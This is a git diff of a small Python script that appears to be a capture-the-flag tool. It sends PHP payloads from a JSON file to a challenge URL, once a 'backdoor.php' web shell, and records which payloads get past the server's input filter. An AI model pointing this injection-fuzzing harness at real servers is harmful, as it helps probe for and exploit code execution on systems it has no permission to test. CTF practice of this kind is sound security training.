@@ -4,16 +4,17 @@ import json
 
 from requests_html import HTMLSession
 
-url = 'http://fa1f669b-39f3-43dc-a556-c8725881aa1a.challenge.ctf.show:8080/backdoor.php'
-cmd = 'Letmein'
-method = 'post'
-exclude = '<!-- 36D姑娘留的后门，闲人免进 -->\r\n'
+url = 'http://632-09bcb4c2-da60-4791.nss.ctfer.vip:9080/'
+cmd = 'c'
+method = 'get'
+exclude = '请不要输入奇奇怪怪'
 s = HTMLSession()
 
-
+work_lst = []
+fuz_lst = []
 def main():
     obj = init()
-    for k, v, in obj.items():
+    for key, v, in obj.items():
         v = v + ';'
         if method == 'get':
             res = s.get(f'{url}?{cmd}={v}')
@@ -21,16 +22,20 @@ def main():
             res = s.post(url, data={cmd: v})
 
         if exclude and exclude in res.text:
+            fuz_lst.append(key)
             continue
-        print(k.center(24, '-') + '\n',  res.text)
+        work_lst.append(key)
+        print(key.center(24, '-') + '\n',  res.text)
 
 
 
 def init():
-    jso = open('php_fuzz.json', 'r').read()
+    jso = open('php_fuzz.json', 'r', encoding="utf-8").read()
     r = json.loads(jso)
     return r
 
 
 if __name__ == '__main__':
     main()
+    print('fuz list is ', fuz_lst)
+    print('work list is ', work_lst)
